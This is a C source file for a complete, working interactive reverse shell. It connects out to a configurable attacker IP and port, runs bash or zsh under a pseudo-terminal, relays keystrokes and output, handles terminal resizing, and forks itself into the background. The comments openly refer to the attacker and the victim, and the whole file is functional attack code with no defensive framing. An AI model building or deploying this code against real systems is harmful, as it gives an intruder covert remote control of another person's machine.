#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/poll.h>
#include <sys/errno.h>
#include <sys/ioctl.h>

#if defined(__linux__) || defined(__MSYS__)
    #include <pty.h>
#elif defined(__APPLE__)
    #include <util.h>
#endif

// IP and port of the attacker's machine
#define ATTACKER_IP "127.0.0.1"
#define ATTACKER_PORT 4444

typedef struct sockaddr_in sockaddr_in;
typedef struct sockaddr sockaddr;
typedef struct pollfd pollfd;
typedef struct winsize winsize;

void monitor_fd(int socket_fd, int pty_fd)
{
    // Buffer to temporarily store the
    // data before sending over the network
    char buffer[4096];

    // Create an array of file descriptors
    // that will be used for waiting for
    // input and output
    pollfd fds[2];
    
    // Store the amount of data read
    // from the socket (not the data itself)
    ssize_t bytes_read, peek;

    // This marker indicates that we need to update
    // the window size. The attacker will send this
    // marker byte to the victim if the attacker's
    // window size changes
    uint8_t marker = 0xFF;

    // Struct to hold properties of the socket
    winsize ws;

    // Socket FD
    fds[0].fd = socket_fd;
    fds[0].events = POLLIN;

    // PTY FD
    fds[1].fd = pty_fd;
    fds[1].events = POLLIN;

    // Keep looping until the attacker
    // ends the session or the connection
    // gets lost
    while (true)
    {
        // Waiting for an event from the
        // file descriptors
        if (poll(fds, 2, -1) < 0)
        {
            // Check for any interrupts
            // from the OS and ignore them
            if (errno == EINTR) continue;
            perror("poll");
            break;
        }
        
        // This is the main flow of the program
        //
        // Here we will monitor for any I/O
        // events from the file descriptors

        // Socket -> PTY
        if (fds[0].revents & (POLLIN | POLLHUP))
        {
            // Check if we read 0xFF from the attacker
            // This indicates that we need a window size change
            peek = recv(socket_fd, &marker, sizeof(uint8_t), MSG_PEEK);
            if (peek == 1 && marker == 0xFF)
            {
                // Consume the marker byte 0xFF
                read(socket_fd, &marker, 1);

                // Once we have consumed the marker byte,
                // we need to now read the data containing
                // the new window size
                if (read(socket_fd, &ws, sizeof(ws)) == sizeof(ws))
                {
                    // If the read was successful, we now
                    // apply the new window size to
                    // the PTY
                    ioctl(pty_fd, TIOCSWINSZ, &ws);
                }
                continue;
            }

            // Read data from the socket
            bytes_read = read(socket_fd, buffer, sizeof(buffer));

            // Check if we didn't read anything
            // and exit if nothing is read
            if (bytes_read <= 0) break;

            // Write to the PTY we created
            // Exit if we couldn't write to the PTY
            if (write(pty_fd, buffer, (size_t)bytes_read) < 0) break;
        }

        // PTY -> socket
        if (fds[1].revents & (POLLIN | POLLHUP))
        {
            // Read data from the PTY
            bytes_read = read(pty_fd, buffer, sizeof(buffer));

            // Check if we didn't read anything
            // and exit if nothing is read
            if (bytes_read <= 0) break;

            // Write to the socket we created
            // Exit if we couldn't write to the socket
            if (write(socket_fd, buffer, (size_t)bytes_read) < 0) break;
        }

        // Check for any error events
        if (fds[0].revents & (POLLERR | POLLNVAL)) break;
        if (fds[1].revents & (POLLERR | POLLNVAL)) break;
    }
}

void create_pty(int socket_fd)
{
    // File descriptor used for I/O for PTY
    int pty_fd;

    // Hold pid values for child processes
    pid_t child_one_pid, child_two_pid;

    // We will now create a PTY device
    // along with a child process
    //
    // pty_fd will hold the device itself
    // child_one_pid will hold the child process
    child_one_pid = forkpty(&pty_fd, NULL, NULL, NULL);

    // Check if child process creation failed
    if (child_one_pid < 0)
    {
        perror("forkpty");
        exit(EXIT_FAILURE);
    }

    // Execute the actual shell program
    // in the child process
    if (child_one_pid == 0)
    {
// Linux or Windows (MSYS2)
#if defined(__linux__) || defined(__MSYS__)
        execlp("bash", "bash", NULL);
// macOS
#elif defined(__APPLE__)
        execlp("zsh", "zsh", NULL);
#endif
        perror("execlp");
        exit(EXIT_FAILURE);
    }

    // The first child is running in the
    // background
    //
    // We want this program as a whole to
    // run in the background
    //
    // What we will do then is create another
    // child process to run the rest of
    // the program
    //
    // Then we will exit the parent and the
    // whole program will run in the
    // background
    
    // Create the second child process
    child_two_pid = fork();

    // Check if child process creation failed
    if (child_two_pid < 0)
    {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    // Run rest of the program in the
    // child process
    if (child_two_pid == 0)
    {
        monitor_fd(socket_fd, pty_fd);
        close(socket_fd);
        close(pty_fd);
        waitpid(child_one_pid, NULL, 0);
    }

    // Exit the parent process
    if (child_two_pid > 0) return;
}

int connect_to_server(const char *ip, const uint16_t port)
{
    // Socket used for network communication
    int socket_fd;

    // Struct to hold properties of the socket
    sockaddr_in sa;

    // Define properties of the socket
    // Use IPv4 for network communication
    sa.sin_family = AF_INET;

    // Convert string representation of
    // IP to an actual number
    sa.sin_addr.s_addr = inet_addr(ip);

    // Change the byte order of the integer
    // to network byte order
    sa.sin_port = htons(port);

    // Create the socket that will be used
    // to communicate over the network
    // AF_INET -> Use IPv4
    // SOCK_STREAM -> Use connection oriented socket (TCP) (reliable byte stream)
    // IPPROTO_TCP -> Use TCP protocol
    socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_fd < 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Connect to the attacker using the socket
    // we just created.
    if (connect(socket_fd, (sockaddr*)&sa, sizeof(sa)) != 0)
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    return socket_fd;
}

int main(void)
{
    // Connect to the attacker's machine
    // using the IP and port
    int socket_fd = connect_to_server(ATTACKER_IP, ATTACKER_PORT);
    create_pty(socket_fd);
    return 0;
}
